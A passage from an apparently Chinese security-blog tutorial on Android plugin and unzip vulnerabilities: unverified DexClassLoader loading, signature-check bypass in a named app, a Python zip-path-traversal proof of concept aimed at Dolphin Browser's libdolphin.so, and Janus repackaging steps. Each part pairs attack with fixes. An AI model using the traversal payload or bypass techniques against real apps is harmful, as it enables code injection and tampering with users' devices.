plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统应用安装：开机时完成，没有安装界面</span><br><span class="line">网络下载的应用安装：通过市场应用完成，没有安装界面</span><br><span class="line">ADB工具安装：没有安装界面</span><br><span class="line">第三方应用安装：通过packageinstall.apk应用安装，有安装界面</span><br></pre></td></tr></table></figure><p>但是其实无论通过哪种方式安装都要通过PackageManagerService来完成安装的主要工作，最终在PMS中会去验证签名信息，如v3验证方式一样</p><h3 id="4-Android动态加载"><a href="#4-Android动态加载" class="headerlink" title="4.Android动态加载"></a>4.Android动态加载</h3><p>Android动态加载总会涉及到插件化、热部署、热修复等，这里我在网上查阅资料后，给大家总结了下动态加载的场景使用和分类：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/1.png" alt="image-20220218172137791"></p><p>动态加载，就是程序运行时，可以加载外部的可执行文件并运行，这样使得我们可以不用安装apk就可以更新应用，针对一些SDK项目，可以加快app新版本的覆盖率、快速修复线上bug。这里运行时是指应用冷启动并开始工作后，外部可以是SD卡，可以是data目录，也可以是jniLib目录，这些可执行文件是没有随着应用一起编译的的</p><p>动态加载的特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）app在运行的时候，可以通过加载一些本身不存在的文件，来实现一定功能，这种经常应用在app更新的过程中</span><br><span class="line">（2）可执行文件是可以替换的，更换静态资源不属于动态加载</span><br><span class="line">（3）动态加载的核心思想就是动态调用外部的dex文件，Android Apk自带的dex是程序入口，所有功能可以直接从服务器中下载dex来完成</span><br></pre></td></tr></table></figure><p>Android动态加载按照工作机制不同，可以分为<code>虚拟机层动态加载</code>和<code>Native层动态加载</code>两大类</p><p>这里由于本文主要讲解动态加载方面漏洞，所以对热更新、热修复等原理就不深究了，大家感兴趣可以下去查阅相关资料，动态加载原理详细可以参考我上一篇帖子：<a href="https://bbs.pediy.com/thread-271538.htm">Android加壳脱壳学习（1）——动态加载和类加载机制详解</a></p><h2 id="三、插件化和解压缩安全场景和分类"><a href="#三、插件化和解压缩安全场景和分类" class="headerlink" title="三、插件化和解压缩安全场景和分类"></a>三、插件化和解压缩安全场景和分类</h2><h3 id="1-插件化漏洞的安全场景"><a href="#1-插件化漏洞的安全场景" class="headerlink" title="1.插件化漏洞的安全场景"></a>1.插件化漏洞的安全场景</h3><p>前文我们知道了Android的动态加载机制和签名机制，Android插件化机制具有模块解耦性，可以动态升级按序加载，而且当下很多APP都使用了热部署、热修复、插件化等技术都采用了动态加载技术，这样可以实现APP的快速更新，但是也带来一定的安全隐患，使得很多恶意软件能熬过安全检测，来动态加载代码。而执行加载绕过执行漏洞一般与Android 的签名机制密不可分，所以上文我们也很详细的讲解了Android的签名机制。</p><h3 id="2-插件化漏洞的分类"><a href="#2-插件化漏洞的分类" class="headerlink" title="2.插件化漏洞的分类"></a>2.插件化漏洞的分类</h3><p>很多APP通过动态加载一些dex或so文件，但是考虑到存在动态加载的安全性问题，往往会对加载的文件进行签名校验机制，因此我们可以将插件化漏洞分为两类：动态加载漏洞和签名校验绕过漏洞</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/29.png" alt="image-20220307123657260"></p><h3 id="3-解压缩漏洞的安全场景"><a href="#3-解压缩漏洞的安全场景" class="headerlink" title="3.解压缩漏洞的安全场景"></a>3.解压缩漏洞的安全场景</h3><p>Android中经常会涉及到解压缩问题，比如动态加载机制，可能下载了apk&#x2F;zip文件，然后在本地做解压工作，还有就是一些资源在本地占用apk包的太大，就也打包成zip放到服务端，使用的时候再下发。Android在解压zip文件，使用的是ZipInputStream和ZipEntry类，代码比较简单，但是ZipEntry.getName的方法存在的漏洞就是返回的是文件名，并没有对特殊字符处理，linux中<code>../</code>可以命令文件但是这个可以进行穿越上层目录，就会带来一定的安全隐患</p><h3 id="4-签名机制和解压缩漏洞分类"><a href="#4-签名机制和解压缩漏洞分类" class="headerlink" title="4.签名机制和解压缩漏洞分类"></a>4.签名机制和解压缩漏洞分类</h3><p>我们这里列举两个典型的漏洞：如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/53.png" alt="image-20220308105246647"></p><h2 id="四、插件化漏洞原理分析和复现"><a href="#四、插件化漏洞原理分析和复现" class="headerlink" title="四、插件化漏洞原理分析和复现"></a>四、插件化漏洞原理分析和复现</h2><h3 id="1-动态加载漏洞"><a href="#1-动态加载漏洞" class="headerlink" title="1.动态加载漏洞"></a>1.动态加载漏洞</h3><h4 id="（1）原理分析"><a href="#（1）原理分析" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>Android系统提供类加载器DexClassLoader，可以在运行时动态加载执行包含的JAR或APK文件内的DEX文件，这样可能导致所加载的Dex文件被恶意应用替换或代码注入，如果不对Dex文件进行签名校验，就可能导致加载的是恶意代码，这样就会进一步造成严重危害</p><h4 id="（2）案例1——动态加载"><a href="#（2）案例1——动态加载" class="headerlink" title="（2）案例1——动态加载"></a>（2）案例1——动态加载</h4><p>案例准备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原apk</span><br><span class="line">加载dex</span><br></pre></td></tr></table></figure><p>我们先编写一个测试类文件,然后生成dex文件，这里我们在dex文件中只加入字符串信息，我们源apk并未加入签名校验机制</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/31.png" alt="image-20220218192716863"></p><p>我们先将dex文件放到模拟器的sdcard&#x2F;下</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/32.png" alt="image-20211010150449575"></p><p>我们新建一个程序，然后编写主程序的代码，并授权sd读取权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">appContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getApplication();</span><br><span class="line">testDexClassLoader(appContext,<span class="string">&quot;/sdcard/classes.dex&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>然后我们编写类加载器代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">testDexClassLoader</span><span class="params">(Context context, String dexfilepath)</span> &#123;</span><br><span class="line">        <span class="comment">//构建文件路径：/data/data/com.emaxple.test02/app_opt_dex，存放优化后的dex,lib库</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">optfile</span> <span class="operator">=</span> context.getDir(<span class="string">&quot;opt_dex&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">libfile</span> <span class="operator">=</span> context.getDir(<span class="string">&quot;lib_dex&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parentclassloader</span> <span class="operator">=</span> MainActivity.class.getClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">tmpclassloader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">    <span class="comment">//可以为DexClassLoader指定父类加载器</span></span><br><span class="line">        <span class="type">DexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexfilepath,optfile.getAbsolutePath(),libfile.getAbsolutePath(),parentclassloader);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = dexClassLoader.loadClass(<span class="string">&quot;com.example.test.TestClass&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(clazz!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">testFuncMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;test02&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">                testFuncMethod.invoke(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>效果显示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/30.png" alt="image-20211010150449575"></p><p>这里说明加载成功了，如果我们这里写的是一段恶意代码，这样就会进行攻击，造成破坏</p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>我们上文的动态加载漏洞，是因为源APK并未对加载的dex文件进行签名校验，从而导致容易导入恶意代码，当然从Android 4.4后加入了<strong>对JAR&#x2F;DEX存放目录文件的user_id 和动态加载JAR&#x2F;DEX的进程的user_id是否一致的判断，如果不一致将抛出异常导致加载失败</strong>，这样就很好的可以防范替换加载的dex文件，进行恶意注入</p><p>解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）将动态加载的DEX/APK文件放置在APK内部或应用私有目录中</span><br><span class="line">（2）使用加密网络协议https进行下载加载的并将其放置在应用私有目录中</span><br><span class="line">（3）对加载的Dex文件进行完整性校验和签名校验</span><br></pre></td></tr></table></figure><h3 id="2-签名检验绕过漏洞"><a href="#2-签名检验绕过漏洞" class="headerlink" title="2.签名检验绕过漏洞"></a>2.签名检验绕过漏洞</h3><h4 id="（1）原理分析-1"><a href="#（1）原理分析-1" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>我们知道一般对APK的验证，主要使用的是签名校验或者MD5校验，使用校验的方式较多。而签名校验一般是处理APK中动态加载或防止二次重打包的问题。</p><p>我们可以将APK中的签名检验机制进一步进行分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java层的签名校验：</span><br><span class="line">原理：这种是开发者在APK java层中加入了签名校验代码，然后通过校验加入文件的MD5值或者SHA1值来对文件进行校验</span><br><span class="line">解决方案：一般这种情况，我们通过定位到APK中的签名代码段，然后进行hook 篡改或者进行修改后重打包就可以进行绕过</span><br><span class="line">so层的签名校验：</span><br><span class="line">原理：由于java可解释语言的原因，所以后来开发者又将签名代码放入so层，从而增加逆向工作的难度</span><br><span class="line">解决方案：这种情况，同样可以使用IDA或GDB进行动态调试确定到签名代码段，然后使用hook 注入技术或静态修改来进行绕过</span><br><span class="line">在线签名校验：</span><br><span class="line">原理：由于前两种方式都是静态校验的方式，这样的安全性仍然较低，后来更多厂商通过服务器在线进行验证，将签名密钥发送然后在so层或java层中进行校验</span><br><span class="line">解决方案：这种情况，我们要使用抓包软件对服务器发送的数据包进行抓取，在成功获取正确密钥后，再去hook对应的签名代码段，从而就可以实现绕过</span><br></pre></td></tr></table></figure><p>这一部分完整性保护大家可以详细的参考看雪陌殇大佬的帖子<a href="https://bbs.pediy.com/thread-250990.htm">Android应用完整性保护总结</a></p><h4 id="（2）案例2——java层签名绕过"><a href="#（2）案例2——java层签名绕过" class="headerlink" title="（2）案例2——java层签名绕过"></a>（2）案例2——java层签名绕过</h4><p>案例：书旗小说.apk</p><p>我们发现书旗小说在进行重新签名后，再次安装会报错，首先我们AndroidKiller解析APP：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/33.png" alt="image-20211010150449575"></p><p>然后我们开始进行定位，这里我们使用常见的定位点：<strong>signature、killProcess、PageManager</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature、killProcess、PageManager 一般是签名代码的关键函数，所以当我们发现这三个函数同时出现，很大程度代表了签名点</span><br></pre></td></tr></table></figure><p>我们这里搜索signature或killProcess，我们找到了签名三兄弟：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/34.png" alt="image-20211010150449575"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/35.png" alt="image-20211010150449575"></p><p>分析签名的逻辑，修改后回编译，再安装显示成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/37.png" alt="image-20211010150449575"></p><h4 id="（3）案例3——so层签名绕过"><a href="#（3）案例3——so层签名绕过" class="headerlink" title="（3）案例3——so层签名绕过"></a>（3）案例3——so层签名绕过</h4><p>因为so层和java层签名绕过原理相近，只是so层是分析汇编代码，java层分析Smali源码，这里我们参考一个博主的案例，我列举一下</p><p>首先我们根据NDK注册定位到so层的入口点，去查找JNI_Onload函数，然后开始去查找上面的三兄弟</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/38.png" alt="image-20220307134654634"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/39.png" alt="image-20220307134716046"></p><p>这里我们就很好的定位到了代码段，后续就是分析逻辑，修改对应的校验点即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/40.png" alt="image-20220307134854959"></p><p>最后就会发现签名成功的绕过</p><h4 id="（4）案例4——在线签名绕过"><a href="#（4）案例4——在线签名绕过" class="headerlink" title="（4）案例4——在线签名绕过"></a>（4）案例4——在线签名绕过</h4><p>在线签名校验主要是抓取校验部分的数据包，然后去查找cookie中的public_key，或者签名Signature值，通过分析数据包后再定位到相应的代码段将值回传到相应的代码段即可</p><p>这里有一个案例大家可以参考<a href="https://bbs.pediy.com/thread-270634.htm#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B">Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解 </a>中酷狗直播的漏洞实现，这里就是通过在线修改了MD5值，然后使得程序在升级过程中绕过了升级校验，从而成功的注入了恶意病毒</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/41.png" alt="image-20220307134854959"></p><h4 id="（5）安全防护"><a href="#（5）安全防护" class="headerlink" title="（5）安全防护"></a>（5）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）java层和so层都可以进一步混淆，来防止字符定位的方法</span><br><span class="line">（2）可以使用反调试技术，来防止动态调试进行定位的方法</span><br><span class="line">（3）可以采用对frida和xposed的检测，来进行防止hook注入</span><br><span class="line">（4）可以尽量采用在线签名，加密传输报文：</span><br><span class="line">客户端将本地程序信息上传到服务端，服务端返回一段校验代码。客户端动态执行代码，返回校验结果</span><br><span class="line">在登陆接口将登录信息在NDK层进行加密，用签名信息进行加密，在登陆接口实现中，进行解密，如果失败不允许登陆</span><br></pre></td></tr></table></figure><h2 id="五、Zip解压缩漏洞分析和复现"><a href="#五、Zip解压缩漏洞分析和复现" class="headerlink" title="五、Zip解压缩漏洞分析和复现"></a>五、Zip解压缩漏洞分析和复现</h2><h3 id="1-原理分析"><a href="#1-原理分析" class="headerlink" title="1.原理分析"></a>1.原理分析</h3><p>因为Linux系统中<code>../</code>代表向上级目录跳转，攻击者可以通过构造相应的Zip文件，利用多个’..&#x2F;‘从而改变zip包中某个文件的存放位置，费用该替换掉应用原有的文件，完成目录穿越。这样严重可能会导致任意代码执行漏洞，危害应用用户的设备安全和信息安全</p><p><code>Java</code> 代码在解压 <code>zip</code> 文件时，会使用到 <code>ZipEntry</code> 类的 <code>getName()</code> 方法，如果 <code>zip</code> 文件中包含 <code>../</code> 的字符串，该方法返回值会原样返回。如果没有过滤掉 <code>getName()</code> 返回值中的 <code>../</code> 字符串，继续解压缩操作，就会在其他目录中创建解压的文件</p><h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><p>样本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">海豚浏览器 V11.4.18</span><br><span class="line">攻击的so文件：libdolphin.so</span><br><span class="line">Poc攻击代码</span><br></pre></td></tr></table></figure><p>我们打开海豚浏览器，并用Fiddler去监控海豚浏览器，Fiddler的配置大家可以参考我之前博客</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/47.png" alt="image-20220307155050126"></p><p>这里我们可以通过抓包去发现主题下载的申请链接，然后我们将主题下载下来，然后解包查看结构，这里我们重命名为zip文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/54.png" alt="image-20220307155156845"></p><p>我们可以发现下载下来的三个资源文件，这也说明海豚浏览器的主题本质是一个zip包</p><p>那么我们如何实现zip目录穿越了，我们是不是可以尝试去构建一个这样的zip包，去替换浏览器的下载包，并重命令去文件名，使得替换浏览器中的关键文件，这里我们就尝试去替换浏览器中的<code>libdolphin.so</code>文件。我们先查看该文件的位置：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/48.png" alt="image-20220307155820156"></p><p>此时我们知道了<code>libdolphin.so</code>文件的存放位置，目录为：<code>/data/data/com.dolphin.browser.express.web/files</code>，这样我们只需要将我们制作的<code>libdolphin.so</code>去替换原文件即可</p><p>我们编写一个<code>libdolphin.so</code>文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/49.png" alt="image-20220307163506122"></p><p>然后我们将生成的so文件重新命名<code>libdolphin.so</code>文件，接下来我们再使用我们的Poc代码更改名称：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ZipPath = <span class="string">&#x27;../../../../../data/data/com.dolphin.browser.express.web/files/libdolphin.so&#x27;</span></span><br><span class="line">    zp = zipfile.ZipFile(<span class="string">&#x27;/root/Desktop/zipAttack/attack.zip&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    zp.write(<span class="string">&#x27;/root/Desktop/zipAttack/libdolphin.so&#x27;</span>,ZipPath)</span><br></pre></td></tr></table></figure><p>此时我们就成功的构造了我们的攻击文件<code>attack.zip</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/50.png" alt="image-20220307165944152"></p><p>然后我们只需要对海豚浏览器下载主题的包进行劫持替换即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/51.png" alt="image-20220307170221500"></p><p>然后我们再次点击手机下载相应主题，发现主题是成功的下载，但是并没有替换成功</p><p>经过验证，我们发现首先正常命名的so文件是可以正常的和主题一起下载成功的</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/52.png" alt="image-20220308102048695"></p><p>然后我们验证，Android中直接重命令文件<code>../../libdolphin.so</code>是可以直接回到上级目录的</p><p>所以综上是因为我测试的Android6.0 已经打了补丁，在进行解压的时候对<code>../</code>这种情况进行了过滤，这样就导致不能进行成功的穿越</p><p>当然这里我们主要是理解zip穿越的原理，这样就可以在很多地方利用这个原理存在的漏洞了</p><h3 id="3-安全防护"><a href="#3-安全防护" class="headerlink" title="3.安全防护"></a>3.安全防护</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对重要的 zip 压缩包文件进行数字签名校验，校验通过才进行解压</span><br><span class="line">检查 zip 压缩包中使用 ZipEntry.getName() 获取的文件名中是否包含 ../ 或者 .. 字符</span><br><span class="line">更换 zip 解压方式，不使用 ZipEntry.getName() 的方式，使用 ZipInputStream 替代</span><br></pre></td></tr></table></figure><p>Google的修复意见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStream</span>(untrustedFileName);</span><br><span class="line"><span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is));</span><br><span class="line"><span class="keyword">while</span>((<span class="type">ZipEntry</span> <span class="variable">ze</span> <span class="operator">=</span> zis.getNextEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(DIR, ze.getName());</span><br><span class="line">  <span class="type">String</span> <span class="variable">canonicalPath</span> <span class="operator">=</span> f.getCanonicalPath();</span><br><span class="line">  <span class="keyword">if</span> (!canonicalPath.startsWith(DIR)) &#123;</span><br><span class="line">    <span class="comment">// SecurityException</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Finish unzipping…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、Janus漏洞分析和复现"><a href="#六、Janus漏洞分析和复现" class="headerlink" title="六、Janus漏洞分析和复现"></a>六、Janus漏洞分析和复现</h2><p>我们上面已经介绍了签名相关的漏洞、和Zip相关的漏洞，下面我们拿2017年的典型漏洞Janus漏洞进行说明，这个漏洞结合了签名和Zip、dex的原理</p><h3 id="1-原理分析-1"><a href="#1-原理分析-1" class="headerlink" title="1.原理分析"></a>1.原理分析</h3><p>相信Janus漏洞原理大家已经十分熟悉了，作为2017年比较重大的Android漏洞，已经有不少的人对其进行了研究和复现，本节只是初步记录下Janus漏洞的学习过程和复现思路（Janus只针对v1签名，v2签名就无效了）</p><p>Android  ART虚拟机在加载并执行一个文件时，会首先判断这个文件的类型。如果这个文件是一个Dex文件，则按Dex的格式加载执行，如果是一个APK文件，则先抽取APK中的dex文件，然后再执行。而判断的依据是通过文件的头部魔术字（Magic Code）来判断。如果文件的头部魔术字是“dex”则判定该文件为Dex文件，如果文件头部的魔术字是“PK”则判定该文件为Apk文件</p><p>然而Android在安装一个APK时会对APK进行签名校验，但却直接默认该APK就是一个Zip文件（并不检查文件头的魔术字），而ZIP格式的文件一般都是从尾部先读取，因此只要ZIP文件尾部的数据结构没有被破坏，并且在读取过程中只要没有碰到非正常的数据，那么整个读取就不会有任何问题</p><p>因此，Android在加载执行代码时，<strong>只认文件头，而安装签名时只认文件尾</strong></p><p>这样我们构造一个APK<strong>，从其头部看是一个Dex文件，从其尾部看，是一个APK文件</strong>，就可以实施攻击。因此Janus漏洞便是将原APK中的classes.dex抽取出来，改造或替换成攻击者想要执行的dex，并将这个dex和原APK文件拼起来，合成一个文件</p><p>当然我们在构造apk时，还需要修改dex文件的字段和zip文件的字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dex文件修改DexHeader中的file_size，将其调整为合并后文件的大小</span><br><span class="line">zip文件修改尾部Zip,修正[end of central directory record]中[central directory]的偏移和[central directory]中各[local file header]的偏移</span><br></pre></td></tr></table></figure><p>漏洞攻击步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 从设备上取出目标应用的APK文件，并构造用于攻击的DEX文件；</span><br><span class="line">2. 将攻击DEX文件与原APK文件简单拼接为一个新的文件；</span><br><span class="line">3. 修复这个合并后的新文件的ZIP格式部分和DEX格式部分，修复原理如图1所示，需要修复文件格式中的关键偏移值和数据长度值；</span><br><span class="line">最后，将修复后的文件，重命名为APK文件，覆盖安装设备上的原应用即可</span><br></pre></td></tr></table></figure><h3 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><p>实验样本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app-release.apk v1签名的初始样本</span><br><span class="line">classes.dex 修改后的dex文件</span><br><span class="line">out.apk 拼接后的apk文件</span><br><span class="line">janus.py 漏洞拼接代码</span><br></pre></td></tr></table></figure><p>首先，我们通过Android Studio编写apk文件，并通过v1签名生成</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/42.png" alt="image-20220221160839695"></p><p>我们在Bulid—&gt;Generate Signed APK中选择通过v1签名来生成apk文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/46.png" alt="image-20220221160944398"></p><p>我们便得到了app-release.apk文件，我们再通过AndroidKiller去修改源文件的代码，然后重新打包</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/44.png" alt="image-20220221161347673"></p><p>然后我们提取出生成的apk文件中的classes.dex文件</p><p>我们是使用<a href="https://github.com/V-E-O/PoC/blob/master/CVE-2017-13156/janus.py">Janus.py python2版本</a> 和<a href="https://github.com/xyzAsian/Janus-CVE-2017-13156">java版本</a>，这里我们使用Python版本</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/45.png" alt="image-20220221161702364"></p><p>我们就得到拼接的out.apk，我们只需要将这个apk去覆盖原始的apk即可</p><p>问题：</p><p>在尝试了几台Android 6.0的机子后，并未成功复现漏洞，最后推断很大程度是Android 系统打了补丁，所以要复现成功可能只能在未打补丁的系统上才行，不过整体来说是一次很好的学习经历</p><h3 id="3-安全防护-1"><a href="#3-安全防护-1" class="headerlink" title="3.安全防护"></a>3.安全防护</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android7.0后采用了v2签名机制可以有效的抵制Janus漏洞</span><br><span class="line">现在大部分的手机系统已经打上了Janus漏洞的补丁</span><br></pre></td></tr></table></figure><h2 id="七、实验总结"><a href="#七、实验总结" class="headerlink" title="七、实验总结"></a>七、实验总结</h2><p>本文对插件化和解压缩漏洞进行了详细的讲解和漏洞复现，在漏洞复现的过程中，我们发现一个漏洞复现的环境十分重要，因为很多时候曾经的一些典型漏洞都被打了补丁，很难在当下情况复现，当然我们应该更加注重漏洞的原理，从而进行学习，本文可能还存在一些不足之处就请各位大佬指教了。</p><p>本文的相关实验文件存放在知识星球中，本系列的实验文件后面也会逐一上传到知识星球。</p><h2 id="八、参考文献"><a href="#八、参考文献" class="headerlink" title="八、参考文献"></a>八、参考文献</h2><p>dex文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://juejin.cn/post/6844903847647772686</span><br><span class="line">https://www.jianshu.com/p/b79c729f326b</span><br><span class="line">https://www.jianshu.com/p/f7f0a712ddfe</span><br></pre></td></tr></table></figure><p>zip文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 